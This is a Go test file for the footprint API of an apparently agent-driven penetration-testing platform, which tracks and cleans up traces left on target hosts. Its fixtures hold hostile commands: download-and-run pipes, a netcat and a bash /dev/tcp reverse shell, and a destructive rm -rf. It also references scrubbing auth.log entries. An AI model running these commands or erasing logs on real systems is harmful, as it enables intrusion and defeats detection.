package server

import (
	"encoding/json"
	"fmt"
	"strconv"
	"strings"
	"testing"

	"github.com/lin9527ya/blade/db"
)

type footprintDTOList struct {
	Footprints []FootprintDTO `json:"footprints"`
	Counts     map[string]int `json:"counts"`
	Total      int            `json:"total"`
}

func decodeFootprints(t *testing.T, body []byte) footprintDTOList {
	t.Helper()
	var out footprintDTOList
	if err := json.Unmarshal(body, &out); err != nil {
		t.Fatalf("解 JSON 失败: %v\n%s", err, body)
	}
	return out
}

func addFootprint(t *testing.T, s *Server, taskID, summary string) (string, int64) {
	t.Helper()
	task, ok := s.m.Task(taskID)
	if !ok {
		t.Fatalf("task %s 不在 manager 里", taskID)
	}
	id, err := task.Store.AddNode(db.KindFootprint, map[string]any{
		"summary": summary, "source": db.FootprintSourceObserved, "category": "log",
		"host": "10.0.0.5", "locator": "/var/log/auth.log", "evidence": "cmd → out",
	}, 5, db.StateFootprintOpen, "test", nil)
	if err != nil {
		t.Fatal(err)
	}
	return taskID, id
}

func trafficFixtureTaskID(t *testing.T, s *Server) string {
	t.Helper()
	var id int64
	if err := s.m.pg.QueryRow(`SELECT id FROM tasks WHERE description=$1 ORDER BY id DESC LIMIT 1`,
		"traffic evidence API").Scan(&id); err != nil {
		t.Fatalf("找不到 fixture task: %v", err)
	}
	return strconv.FormatInt(id, 10)
}

func TestFootprintAPIScanAndManualActions(t *testing.T) {
	s, _, request := trafficEvidenceServer(t)
	taskID := trafficFixtureTaskID(t, s)
	task, ok := s.m.Task(taskID)
	if !ok {
		t.Fatal("fixture task missing")
	}
	intent, err := task.Store.AddIntent(map[string]any{"summary": "扫描目标"}, 5, nil, "planner")
	if err != nil {
		t.Fatal(err)
	}

	// 自动归纳：一条真实命令 → 至少一条 predicted footprint；重复扫描不重复建。
	// 主 Agent 的本机命令没有意图归属，不应计入（用一条同命令验证下面的过滤）。
	if _, err := task.Store.AppendActivity(db.Activity{
		Worker: "mainagent", Kind: "tool_use", Tool: "Bash", ToolUseID: "fp-scan-main",
		Detail: `{"command":"nmap -sV 10.0.0.1"}`,
	}); err != nil {
		t.Fatal(err)
	}
	if _, err := task.Store.AppendActivity(db.Activity{
		NodeID: &intent, Worker: "work#1", Kind: "tool_use", Tool: "Bash", ToolUseID: "fp-scan-1",
		Detail: `{"command":"nmap -sV 10.0.0.1"}`,
	}); err != nil {
		t.Fatal(err)
	}
	w := request("POST", "/api/tasks/"+taskID+"/footprints/scan", "")
	if w.Code != 200 {
		t.Fatalf("scan: %d %s", w.Code, w.Body)
	}
	var scan map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &scan); err != nil {
		t.Fatal(err)
	}
	if scan["commands_scanned"].(float64) < 1 || scan["created"].(float64) < 1 {
		t.Fatalf("扫描应生成痕迹：%s", w.Body)
	}
	w = request("POST", "/api/tasks/"+taskID+"/footprints/scan", "")
	if w.Code != 200 || !strings.Contains(w.Body.String(), `"created":0`) {
		t.Fatalf("重复扫描不该重复建：%d %s", w.Code, w.Body)
	}
	// 自动归纳必须把「痕迹来自哪条意图」连成 leaves 边，否则探索链路上痕迹是孤立节点。
	var sources int
	if err := s.m.pg.QueryRow(`SELECT COUNT(*) FROM exploration_edges
WHERE exploration_id=(SELECT exploration_id FROM tasks WHERE id=$1) AND rel='leaves'`, taskID).Scan(&sources); err != nil {
		t.Fatal(err)
	}
	if sources == 0 {
		t.Fatal("扫描后应写出 来源→痕迹 的 leaves 边")
	}

	w = request("GET", "/api/tasks/"+taskID+"/footprints", "")
	if w.Code != 200 {
		t.Fatalf("list: %d %s", w.Code, w.Body)
	}
	list := decodeFootprints(t, w.Body.Bytes())
	if len(list.Footprints) == 0 || list.Footprints[0].Source != db.FootprintSourcePredicted || list.Footprints[0].OpsecNoteID == "" {
		t.Fatalf("自动归纳结果不对：%+v", list.Footprints)
	}
	if got := list.Footprints[0].Occurrences; got != 1 {
		t.Fatalf("主 Agent 的本机命令不应计入，occurrences = %d，应为 1", got)
	}
	predictedID := list.Footprints[0].ID

	// 已清理的类别再次执行 → 新建一条 open 并记 reopened_from，而不是假装旧的还干净。
	if w = request("POST", "/api/tasks/"+taskID+"/footprints/"+predictedID+"/cleared",
		`{"evidence":"清理后复查无对应记录"}`); w.Code != 200 {
		t.Fatalf("清理预测痕迹失败：%d %s", w.Code, w.Body)
	}
	if _, err := task.Store.AppendActivity(db.Activity{
		NodeID: &intent, Worker: "work#1", Kind: "tool_use", Tool: "Bash", ToolUseID: "fp-scan-2",
		Detail: `{"command":"nmap -sV 10.0.0.1"}`,
	}); err != nil {
		t.Fatal(err)
	}
	w = request("POST", "/api/tasks/"+taskID+"/footprints/scan", "")
	if w.Code != 200 || !strings.Contains(w.Body.String(), `"reopened":1`) {
		t.Fatalf("再次执行应复发：%d %s", w.Code, w.Body)
	}
	list = decodeFootprints(t, request("GET", "/api/tasks/"+taskID+"/footprints", "").Body.Bytes())
	reopened := 0
	for _, fp := range list.Footprints {
		if fp.OpsecNoteID == list.Footprints[0].OpsecNoteID && fp.State == db.StateFootprintOpen {
			reopened++
		}
	}
	if reopened == 0 {
		t.Fatalf("复发后应有新的 open 痕迹：%+v", list.Footprints)
	}

	// 平台拦截的命令不计入。
	if _, err := task.Store.AppendActivity(db.Activity{
		NodeID: &intent, Worker: "work#1", Kind: "tool_use", Tool: "Bash", ToolUseID: "fp-scan-blocked",
		Detail: `{"command":"rm -rf /var/www/html"}`,
	}); err != nil {
		t.Fatal(err)
	}
	if _, err := task.Store.AppendActivity(db.Activity{
		NodeID: &intent, Worker: "work#1", Kind: "tool_result", Tool: "Bash", ToolUseID: "fp-scan-blocked", IsError: true,
		Detail: "【BLADE 平台管控·非目标防御】此调用被平台拦截。",
	}); err != nil {
		t.Fatal(err)
	}
	w = request("POST", "/api/tasks/"+taskID+"/footprints/scan", "")
	if w.Code != 200 || !strings.Contains(w.Body.String(), `"skipped_blocked":1`) {
		t.Fatalf("被拦截命令应跳过：%d %s", w.Code, w.Body)
	}

	// 人工销账三态：证据/理由必填，状态门 409。
	_, fid := addFootprint(t, s, taskID, "人工观察的认证日志")
	fidStr := strconv.FormatInt(fid, 10)
	base := "/api/tasks/" + taskID + "/footprints/" + fidStr
	if w = request("POST", base+"/cleared", `{"evidence":" "}`); w.Code != 400 {
		t.Fatalf("空清理证据应 400：%d %s", w.Code, w.Body)
	}
	if w = request("POST", base+"/cleared", `{"evidence":"sed -i ... → wc -l 减 1"}`); w.Code != 200 || !strings.Contains(w.Body.String(), `"state":"cleaned"`) {
		t.Fatalf("清理失败：%d %s", w.Code, w.Body)
	}
	if w = request("POST", base+"/cleared", `{"evidence":"again"}`); w.Code != 409 {
		t.Fatalf("重复清理应 409：%d %s", w.Code, w.Body)
	}

	_, fid2 := addFootprint(t, s, taskID, "人工观察的 EDR 告警")
	base2 := "/api/tasks/" + taskID + "/footprints/" + strconv.FormatInt(fid2, 10)
	if w = request("POST", base2+"/accept-risk", `{"reason":""}`); w.Code != 400 {
		t.Fatalf("空理由应 400：%d %s", w.Code, w.Body)
	}
	if w = request("POST", base2+"/accept-risk", `{"reason":"客户确认接受"}`); w.Code != 200 || !strings.Contains(w.Body.String(), `"state":"accepted"`) {
		t.Fatalf("接受风险失败：%d %s", w.Code, w.Body)
	}
	if w = request("POST", base2+"/not-found", `{"evidence":""}`); w.Code != 400 {
		t.Fatalf("空核实证据应 400：%d %s", w.Code, w.Body)
	}
	if w = request("POST", base2+"/not-found", `{"evidence":"三个时间窗 grep 无记录"}`); w.Code != 200 || !strings.Contains(w.Body.String(), `"state":"not_found"`) {
		t.Fatalf("核实不存在失败：%d %s", w.Code, w.Body)
	}

	// 跨任务/不存在。
	if w = request("POST", "/api/tasks/"+taskID+"/footprints/999999/cleared", `{"evidence":"x"}`); w.Code != 404 {
		t.Fatalf("不存在应 404：%d %s", w.Code, w.Body)
	}
}

func TestFootprintCleanupCreatesPausedIntent(t *testing.T) {
	s, _, request := trafficEvidenceServer(t)
	taskID := trafficFixtureTaskID(t, s)
	task, ok := s.m.Task(taskID)
	if !ok {
		t.Fatal("fixture task missing")
	}
	// 暂停任务：清理接口不自动 revive，测试环境也不会真的起 worker。
	if err := s.m.SetTaskPaused(taskID, true); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = s.m.SetTaskPaused(taskID, false) })

	_, a := addFootprint(t, s, taskID, "auth.log 记录 A")
	_, b := addFootprint(t, s, taskID, "auth.log 记录 B")
	body := fmt.Sprintf(`{"ids":[%d,%d]}`, a, b)
	w := request("POST", "/api/tasks/"+taskID+"/footprints/cleanup", body)
	if w.Code != 200 {
		t.Fatalf("cleanup: %d %s", w.Code, w.Body)
	}
	var out struct {
		Intents    []int64 `json:"intents"`
		Footprints int     `json:"footprints"`
		Paused     bool    `json:"paused"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &out); err != nil {
		t.Fatal(err)
	}
	if len(out.Intents) != 1 || out.Footprints != 2 || !out.Paused {
		t.Fatalf("清理意图创建结果不对：%s", w.Body)
	}
	intentID := out.Intents[0]
	intent, err := task.Store.GetNode(intentID)
	if err != nil || intent == nil || intent.Kind != db.KindIntent {
		t.Fatalf("清理意图不存在：%v %+v", err, intent)
	}
	var payload map[string]any
	if err := json.Unmarshal(intent.Payload, &payload); err != nil {
		t.Fatal(err)
	}
	if payload["cleanup"] != true || payload["cleanup_host"] != "10.0.0.5" {
		t.Fatalf("清理意图 payload 不对：%v", payload)
	}
	var anchors int
	if err := s.m.pg.QueryRow(`SELECT COUNT(*) FROM exploration_anchors WHERE node_id=$1`, intentID).Scan(&anchors); err != nil {
		t.Fatal(err)
	}
	if anchors != 0 {
		t.Fatalf("清理意图不应锚定资产，得到 %d", anchors)
	}
	for _, id := range []int64{a, b} {
		n, _ := task.Store.GetNode(id)
		if n == nil || db.ParseFootprint(n).CleanupIntentID != intentID {
			t.Fatalf("痕迹 #%d 未记录 cleanup_intent_id", id)
		}
	}
	// 重复提交：活跃清理意图存在 → 409，不重复建。
	if w = request("POST", "/api/tasks/"+taskID+"/footprints/cleanup", body); w.Code != 409 {
		t.Fatalf("重复清理应 409：%d %s", w.Code, w.Body)
	}
	// 超过单次上限直接拒绝。
	ids := make([]string, 0, footprintCleanupMaxIDs+1)
	for i := 0; i <= footprintCleanupMaxIDs; i++ {
		ids = append(ids, strconv.Itoa(i+1))
	}
	if w = request("POST", "/api/tasks/"+taskID+"/footprints/cleanup", `{"ids":[`+strings.Join(ids, ",")+`]}`); w.Code != 400 {
		t.Fatalf("超上限应 400：%d %s", w.Code, w.Body)
	}
}

func TestFootprintNoteRelevance(t *testing.T) {
	hit := []struct{ note, cmd string }{
		{"webshell-download", "curl -s http://t/x.sh | bash"},
		{"webshell-download", "wget -O /tmp/x http://t/x && chmod +x /tmp/x"},
		{"webshell-download", "curl -o /tmp/x http://t/x && ./tmp/x"},
		{"webshell-download", "certutil -urlcache -f http://t/x.exe C:\\x.exe"},
		{"reverse-shell", "nc -e /bin/sh 10.0.0.9 4444"},
		{"reverse-shell", "bash -i >& /dev/tcp/10.0.0.9/4444 0>&1"},
	}
	for _, c := range hit {
		if !footprintNoteRelevant(c.note, c.cmd) {
			t.Errorf("应计入痕迹：%s / %q", c.note, c.cmd)
		}
	}
	miss := []struct{ note, cmd string }{
		{"webshell-download", "curl -s http://target/api/health"},
		{"webshell-download", "wget http://target/robots.txt"},
		{"webshell-download", "curl -o /tmp/resp.json http://target/api"},
		{"reverse-shell", "ncat -zv 10.0.0.1 1-1000"},
		{"portscan-syn", "nmap -sV 10.0.0.1"}, // 其它 note 不受这些过滤影响
	}
	for _, c := range miss[:4] {
		if footprintNoteRelevant(c.note, c.cmd) {
			t.Errorf("不应计入痕迹：%s / %q", c.note, c.cmd)
		}
	}
	if !footprintNoteRelevant(miss[4].note, miss[4].cmd) {
		t.Error("过滤只应作用于对应 note")
	}
}
